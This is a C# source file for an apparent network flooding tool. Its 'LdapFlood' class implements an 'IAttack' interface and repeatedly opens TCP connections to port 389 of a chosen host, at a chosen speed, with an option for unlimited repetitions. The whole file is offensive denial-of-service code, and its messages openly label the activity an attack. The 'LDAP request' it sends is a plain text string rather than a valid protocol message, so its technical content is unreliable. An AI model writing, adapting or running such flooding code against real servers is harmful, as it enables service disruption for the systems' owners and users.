using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;

namespace ConnectFlood
{
    public class LdapFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            string host = ExtractHost(target);

            if (string.IsNullOrEmpty(host))
            {
                Console.WriteLine("[LDAP] Invalid target. Exiting...");
                return;
            }

            Console.WriteLine($"[LDAP] Attacking {host} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms | Port: 389");

            int sentPackets = 0;

            while (packetCount == -1 || sentPackets < packetCount)
            {
                TcpClient tcpClient = new TcpClient();
                NetworkStream stream = null;

                try
                {
                    IPAddress ipAddr;
                    try
                    {
                        ipAddr = Dns.GetHostEntry(host).AddressList[0];
                    }
                    catch
                    {
                        Console.WriteLine($"[LDAP] Failed to resolve {host}, skipping...");
                        continue;
                    }

                    IPEndPoint ldapServer = new IPEndPoint(ipAddr, 389);

                    Console.WriteLine($"[LDAP] Connecting to {host} ({ipAddr})...");
                    tcpClient.Connect(ldapServer);
                    stream = tcpClient.GetStream();
                    Console.WriteLine($"[LDAP] Connected to {host}:389");

                    // إرسال الحزمة
                    byte[] ldapPacket = GenerateLdapRequest(host);
                    stream.Write(ldapPacket, 0, ldapPacket.Length);
                    Console.WriteLine($"[LDAP] Packet {sentPackets + 1} sent to {host}:389");

                    sentPackets++;

                    if (speed > 1)
                        Thread.Sleep(speed);
                }
                catch (IOException ex)
                {
                    Console.WriteLine($"[LDAP] IO Error: {ex.Message}");
                    break;
                }
                catch (SocketException ex)
                {
                    Console.WriteLine($"[LDAP] Socket Error: {ex.Message}");
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[LDAP] General Error: {ex.Message}");
                    break;
                }
                finally
                {
                    tcpClient.Close();
                }

                if (packetCount != -1 && sentPackets >= packetCount)
                {
                    break;
                }
            }

            Console.WriteLine("[LDAP] Attack finished.");
        }

        private string ExtractHost(string target)
        {
            try
            {

                target = Regex.Replace(target, @"^https?://", "", RegexOptions.IgnoreCase);
                Uri uri;
                if (Uri.TryCreate($"http://{target}", UriKind.Absolute, out uri))
                {
                    return uri.Host;
                }

                return target.Split(':')[0]; 
            }
            catch
            {
                return null;
            }
        }

        private byte[] GenerateLdapRequest(string host)
        {
            string ldapRequest = $"LDAP Request to {host}";
            return Encoding.ASCII.GetBytes(ldapRequest);
        }
    }
}
